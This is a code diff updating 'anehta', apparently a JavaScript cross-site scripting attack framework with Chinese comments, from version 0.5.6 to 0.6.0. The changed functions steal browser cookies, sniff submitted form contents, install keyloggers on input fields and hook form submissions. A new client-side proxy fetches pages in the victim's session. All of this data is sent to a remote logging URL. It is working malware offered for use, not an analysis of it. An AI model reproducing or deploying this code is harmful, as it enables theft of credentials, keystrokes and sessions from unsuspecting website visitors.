@@ -5,7 +5,7 @@
 //// 定义常量
 //////////////////////////////////////////////////
 var anehta = {
-        Version: '0.5.6',
+        Version: '0.6.0',
         Author: 'axis',
         Contact: 'axis@ph4nt0m.org',
         Homepage: 'http://www.ph4nt0m.org',
@@ -204,6 +204,7 @@ anehta.core.cache = function(){
 	this.setItem = function(pKey, pValue)
 	{
 		if(this.hasItem(pKey) == true){ // 有则覆盖
+			this.items[pKey] = null; // 释放内存
 			this.items[pKey] = pValue; // 覆盖值
 		}
 		else { // 没有则添加
@@ -261,8 +262,10 @@ anehta.core.cache = function(){
 	this.clear = function()
 	{
 		var tmp = this.cache_length;
+		this.keys = null; // 释放内存
 		this.keys = new Array();
 		this.cache_length = 0;
+		this.items = null; // 释放内存
 		this.items = new Array();
 		return tmp;
 	}
@@ -649,16 +652,17 @@ anehta.net.cssGet = function(url){
 anehta.logger = {};
 
 anehta.logger.logInfo = function(param){
-	param = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-          XssInfo_S + "Info: " + param + XssInfo_E;
-	param = escape(param);
+	param = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E + 
+	        "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+	        param;
+	param = encodeURIComponent(param);
 	anehta.net.getURL(logurl+param);
 }
 
 anehta.logger.logCookie = function(){
 	var param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-	            XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E+ // 获取当前URI
-              XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E ;  //获取当前cookie
+	            "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+              "<slaveCookie>" + "\r\n<![CDATA[\r\n" + encodeURIComponent(document.cookie) + "\r\n]]>\r\n" + "</slaveCookie>" ;  //获取当前cookie
 	
   param = anehta.crypto.base64Encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
   //alert(param);
@@ -684,15 +688,17 @@ anehta.logger.logForm = function(o) {
 	for (var i = 0; i < inputs.length; i ++) {
 		if (inputs[i].getAttribute("name") != null && 
 			inputs[i].getAttribute("name") != "") {
-			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
+			param += encodeURIComponent(inputs[i].getAttribute("name")) + "=" + encodeURIComponent(inputs[i].value) + "&";
 		}
 	}
 	
 	// 记录提交的参数到远程服务器
 	param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-	        XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
+	        "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+	        "<formSniffer>" + "\r\n<![CDATA[\r\n" + encodeURIComponent(param) + "\r\n]]>\r\n" + "</formSniffer>";
+	//alert(param);        
 	param = anehta.crypto.base64Encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
-	//alert(param);
+	
 	
 	var img = document.createElement("IMG");
 	document.body.appendChild(img);
@@ -726,7 +732,8 @@ anehta.logger.logCache = function(){
 	    	var cache = "";
 		    for (i=0; i<keys.length; i++) {
 		     	if (anehtaCache.hasItem(keys[i]) == true){
-		     		cache = cache + "\r\n" + XssInfo_S + keys[i] + ": " + anehtaCache.getItem(keys[i]) + XssInfo_E;
+		     		cache = cache + "\r\n" + "<" + keys[i] + ">" + "\r\n<![CDATA[\r\n" + 
+		     		        anehtaCache.getItem(keys[i]) + "\r\n]]>\r\n" + "</" + keys[i] + ">" + " [anehtaCacheSplit] ";
 		     	}
 		    }
 		    //alert(cache_tmp);
@@ -740,14 +747,15 @@ anehta.logger.logCache = function(){
 		        	cache_tmp = cache; // 先把当前cache保存在cache_tmp 中
 		        	
 		        	cache = NoCryptMark + XssInfo_S + "Watermark: " + 
-		                anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-                    XssInfo_S + "Info: " + cache + XssInfo_E;
-	            cache = escape(cache);
+		                anehta.dom.getCookie("anehtaWatermark") + XssInfo_E + " [anehtaCacheSplit] " + 
+		                "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+		                cache;
+	            cache = encodeURIComponent(cache);
 		          anehta.net.postFormIntoIframe(ifr, logurl, cache);
 		        }
 		        else {
-		          var c_tmp = cache_tmp.split(XssInfo_E);
-		          var c = cache.split(XssInfo_E);
+		          var c_tmp = cache_tmp.split(" [anehtaCacheSplit] ");
+		          var c = cache.split(" [anehtaCacheSplit] ");
 		          var sendDiff = "";
 		          var flag = 0; //通过这个标志判断是否找到
 		          
@@ -764,16 +772,17 @@ anehta.logger.logCache = function(){
 		              continue;
 		            } else {
 		            // 没找到，记下来，准备发送                
-                  sendDiff = sendDiff + c[i] + XssInfo_E; // 还原信息头
+                  sendDiff = sendDiff + c[i] ;//+ " [anehtaCacheSplit] "; // 还原信息头
                   //alert("senddiff: "+sendDiff);
                 }
 		          }
 		          
 		          // 只发送差异部分
 		          sendDiff = NoCryptMark + XssInfo_S + "Watermark: " + 
-		                     anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-                         XssInfo_S + "Info: " + sendDiff + XssInfo_E;
-              sendDiff = escape(sendDiff);
+		                     anehta.dom.getCookie("anehtaWatermark") + XssInfo_E + " [anehtaCacheSplit] " + 
+		                     "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+		                     sendDiff;
+              sendDiff = encodeURIComponent(sendDiff);
 		          anehta.net.postFormIntoIframe(ifr, logurl, sendDiff);
 		          
 		          cache_tmp = cache; // 把当前cache保存在cache_tmp 中
@@ -967,11 +976,11 @@ anehta.ajax.post = function(url, param){
     
 		 if (response != null) {
 			 //alert(response);
-			 anehtaCache.setItem("ajaxPostResponse", response);
+			 anehtaCache.setItem("ajaxPostResponse", encodeURIComponent(response));
 		 }		    
 	 });
 }
- 
+
 
 anehta.ajax.get = function(url){
   // 第二个参数是headers
@@ -983,12 +992,67 @@ anehta.ajax.get = function(url){
     
 		if (response != null) {
 			//alert(response);
-			anehtaCache.setItem("ajaxGetResponse", response);
+			anehtaCache.setItem("ajaxGetResponse", encodeURIComponent(response));
 		}
 	});
 } 
 
+// 初始化 ajax
+anehtaXmlHttp.init(); 
 
+// 安装客户端proxy
+anehta.ajax.clientProxy = function(gotoURL, proxyMethod){	
+	
+	//需要加载一个定制的iframe
+	var dd = document.createElement('div');
+	var ifrname = "anehtaPostClientProxy";//生成一个随机的name
+	dd.innerHTML = "<iframe id='" + ifrname + "' name='" + ifrname + "' width=0 height=0 ></iframe>";
+	document.getElementsByTagName('body')[0].appendChild(dd);
+	var ifr = document.getElementById(ifrname);
+	
+	if (proxyMethod == "Get"){
+	  anehtaXmlHttp.get(gotoURL, null, function(response, responseHeaders) {
+		  if (responseHeaders != null) {
+			  //alert(responseHeaders);
+		  }
+    
+		  if (response != null) {
+			  //alert(response);
+			  // 发送页面回服务器
+	      anehta.net.postFormIntoIframe(ifr, logurl, encodeURIComponent(response));
+		  }
+	  });
+	}
+	else if (proxyMethod == "Post"){
+		  // 先切分出query string
+		  var postParam = "";
+		  if (gotoURL.indexOf('?') > -1){		  	
+		    postParam = gotoURL.split('?');
+		    
+		    gotoURL = postParam[0];
+		    postParam = postParam[1];
+		  }
+		  //gotoURL = "http://" + (gotoURL.split('/'))[2];
+		  
+		  // post 请求
+		  anehtaXmlHttp.post(gotoURL, postParam, null, function(response, responseHeaders) {
+		    if (responseHeaders != null) {
+			    //alert(responseHeaders);
+		    }
+    
+		    if (response != null) {
+			    //alert(response);
+			    // 发送页面回服务器
+	        anehta.net.postFormIntoIframe(ifr, logurl, encodeURIComponent(response));	
+		    }		    
+	    });
+	}
+	else { // Method 方法不对
+		return false;
+	}
+}  
+   
+   
 //////////////////////////////////////////////////
 //// Injection Library
 //////////////////////////////////////////////////
@@ -1220,7 +1284,7 @@ anehta.hook.hookForm = function(f){
 		
 	window.anehtaHookForm = function(){
 		anehta.logger.logForm(f);		
-		anehta.core.freeze(200);
+		//anehta.core.freeze(200);
 	}
 	
   anehta.dom.bindEvent(f, "submit", "anehtaHookForm");
@@ -1237,6 +1301,73 @@ anehta.hook.hookAllForms = function(){
 }
 
 
+// Special keyCode Table
+var keyCodeMap = [{code:08, keyVal:" [backspace] "},
+                  {code:09, keyVal:" [tab] "},
+                  {code:13, keyVal:" [enter] "},
+                  {code:16, keyVal:" [shift] "},
+                  {code:17, keyVal:" [ctrl] "},
+                  {code:18, keyVal:" [alt] "},
+                  {code:19, keyVal:" [pause/break] "},
+                  {code:20, keyVal:" [caps lock] "},
+                  {code:27, keyVal:" [escape] "},
+                  {code:32, keyVal:" [space] "},
+                  {code:33, keyVal:" [page up] "},
+                  {code:34, keyVal:" [page down] "},
+                  {code:35, keyVal:" [end] "},
+                  {code:36, keyVal:" [home] "},
+                  {code:37, keyVal:" [left arrow] "},
+                  {code:38, keyVal:" [up arrow] "},
+                  {code:39, keyVal:" [right arrow] "},
+                  {code:40, keyVal:" [down arrow] "},
+                  {code:44, keyVal:" [print screen] "}, // 可能要 onkeyup 才能触发 
+                  {code:45, keyVal:" [insert] "},
+                  {code:46, keyVal:" [delete] "},
+                  {code:91, keyVal:" [left window key] "},
+                  {code:92, keyVal:" [right window key] "},
+                  {code:93, keyVal:" [select key] "},
+                  {code:96, keyVal:" [numpad 0] "},
+                  {code:97, keyVal:" [numpad 1] "},
+                  {code:98, keyVal:" [numpad 2] "},
+                  {code:99, keyVal:" [numpad 3] "},
+                  {code:100, keyVal:" [numpad 4] "},
+                  {code:101, keyVal:" [numpad 5] "},
+                  {code:102, keyVal:" [numpad 6] "},
+                  {code:103, keyVal:" [numpad 7] "},
+                  {code:104, keyVal:" [numpad 8] "},
+                  {code:105, keyVal:" [numpad 9] "},
+                  {code:106, keyVal:" [multiply] "},
+                  {code:107, keyVal:" [add] "},
+                  {code:109, keyVal:" [subtract] "},
+                  {code:110, keyVal:" [decimal point] "},
+                  {code:111, keyVal:" [divide] "},
+                  {code:112, keyVal:" [F1] "},
+                  {code:113, keyVal:" [F2] "},
+                  {code:114, keyVal:" [F3] "},
+                  {code:115, keyVal:" [F4] "},
+                  {code:116, keyVal:" [F5] "},
+                  {code:117, keyVal:" [F6] "},
+                  {code:118, keyVal:" [F7] "},
+                  {code:119, keyVal:" [F8] "},
+                  {code:120, keyVal:" [F9] "},
+                  {code:121, keyVal:" [F10] "},
+                  {code:122, keyVal:" [F11] "},
+                  {code:123, keyVal:" [F12] "},
+                  {code:144, keyVal:" [num lock] "},
+                  {code:145, keyVal:" [scroll lock] "},
+                  {code:186, keyVal:" [semi-colon] "},
+                  {code:187, keyVal:" [equal sign] "},
+                  {code:188, keyVal:" [comma] "},
+                  {code:189, keyVal:" [dash] "},
+                  {code:190, keyVal:" [period] "},
+                  {code:191, keyVal:" [foward slash] "},
+                  {code:192, keyVal:" [grave accent] "},
+                  {code:219, keyVal:" [open bracket] "},
+                  {code:220, keyVal:" [back slash] "},
+                  {code:221, keyVal:" [close bracket] "},
+                  {code:222, keyVal:" [single quote] "}			                  
+                 ];
+			                 
 // 给 element o 装上keylogger; o 一般是 input 或者 textarea
 // trigger 为选择什么时候发送keylog
 anehta.hook.installKeylogger = function(o, trigger){
@@ -1246,20 +1377,35 @@ anehta.hook.installKeylogger = function(o, trigger){
   
   var keylogger = new Array();
   var keystrokes = ""; //记录所有键盘记录
+  //var keycodeMap = [{"09":"Tab","65":"A"}];
+  var showkey = ""; // 只显示可见字符
   
 	window.installKeylogger = function(event){
-
-
+		if (event.keyCode >= 48 && event.keyCode <= 90){ // 数字和字母
+			showkey = String.fromCharCode(event.keyCode);
+		} else {
+			showkey = " [Special Key!] ";
+			
+			/*
+			for (k=0; k<keyCodeMap.length; k++){              
+			  if (event.keyCode == keyCodeMap[k].code){
+				  showkey = keyCodeMap[k].keyVal;
+				  //alert(showkey);
+		  	}
+		  } */             
+		}
+		
 	  // json data format
 	  keylogger[i] = "{tag:'"+o.tagName+
 	                 "', name:'"+o.name+
 	                 "', id:'"+o.id+
 	                 "', press:'"+j+
-	                 "', key:'"+String.fromCharCode(event.keyCode)+
+	                 "', key:'"+showkey+
 	                 "', keyCode:'"+event.keyCode+
 	                 "'}";  
 	
-	  keystrokes = String.fromCharCode(event.keyCode);  
+	  keystrokes = encodeURIComponent(showkey);  
+	  //keystrokes 最好多escape一遍，因为有不可见字符，会导致解析xml出错
 	  anehtaCache.appendItem("KeyStrokes", keystrokes);  
 	  //alert(keylogger);                      
 	  //alert(keystrokes);
@@ -1281,13 +1427,16 @@ anehta.hook.installKeylogger = function(o, trigger){
 	  if (trigger == "blur"){ // 元素blur时触发
 	  	window.logKeyloggerOnBlur = function(){
 	  		
-	  		// 提交数据比较多,需要使用post提交
-	  		keylogger = NoCryptMark + XssInfo_S + "Watermark: " + 
-	                  anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-                    XssInfo_S + "Info: \r\n" + XssInfo_S + "Keylogger: " + keylogger + XssInfo_E + XssInfo_E;
-        //alert(keylogger);            
+	  		// 提交数据比较多,需要使用post提交 ; 多escape一遍 
+	  		keylogger = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+	  		            "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+                    "<Keylogger>" + "\r\n<![CDATA[\r\n" + keylogger + "\r\n]]>\r\n" + "</Keylogger>";
+        //alert(keylogger);
+                   
 	      keylogger = escape(keylogger);
 	      anehta.net.postFormIntoIframe(ifr, logurl, keylogger);
+	      
+	      keylogger = ""; // 重置
 	      
 	  		//anehta.core.freeze(50);
 	  	}
@@ -1295,7 +1444,9 @@ anehta.hook.installKeylogger = function(o, trigger){
 	  } 
 	  else if (trigger == "unload"){ // window.unload 时触发
 	  	window.logKeyloggerUnLoad = function(){	  		
-	  		keylogger = XssInfo_S + "\r\n    Keylogger: " + keylogger + XssInfo_E;
+	  		// 多escape一遍
+	  		keylogger = "<requestURI>" + "\r\n<![CDATA[\r\n" + encodeURI(window.location.href) + "\r\n]]>\r\n" + "</requestURI>" + "\r\n" + // 获取当前URI
+	  		            "<Keylogger>" + "\r\n<![CDATA[\r\n" + keylogger + "\r\n]]>\r\n" + "</Keylogger>";
 
 	      // window.unload 时用post已经不合适了
         anehta.logger.logInfo(keylogger);
@@ -1699,21 +1850,6 @@ anehta.trick = {};
 // 劫持点击链接。idea from http://www.breakingpointsystems.com/community/blog/clickjacking-technique-using-the-mousedown-event
 // by Dustin D. Trammell 
 anehta.trick.hijackLink = function(link, url){
-	/*
-	if ( link.addEventListener ) {
-      link.addEventListener("mousedown", function(e){link.href=url;}, false);
-  } else if ( link.attachEvent ) {
-     link.attachEvent("onmousedown", function(e){link.href=url;});
-  } else {
-  var oldhandler = link["onmousedown"];
-     if ( oldhandler ) {
-        link["onmousedown"] = function(e){oldhandler(e);link.href=url;};
-     } else {
-        link["onmousedown"] = function(e){link.href=url;};
-     }
-  }	
-  */
-
   window.changeHref = function(){ 
   	link.href = url; 
   };
@@ -1787,7 +1923,20 @@ anehta.misc.getCurrentPage = function(){
 }
 
 
+anehta.misc.htmlEncode = function(str){
+  var div = document.createElement('div');
+  var text = document.createTextNode(str);
+  div.appendChild(text);
+  return div.innerHTML;
+}
 
+anehta.misc.htmlDecode = function(strEncodeHTML){
+  var div = document.createElement('div');
+  div.innerHTML = strEncodeHTML;
+  return div.innerText;
+}
+          
+          
 
 
 //////////////////////////////////////////////////
@@ -1796,9 +1945,9 @@ anehta.misc.getCurrentPage = function(){
 anehta.crypto ={};
 
 anehta.crypto.random = function(){
-	var x = Math.random(); 
-	x = x * 100000000000; // 取13位
-	return x;
+        var x = Math.random();
+        x = x * 100000000000; // 取13位
+        return x;
 }
 
 
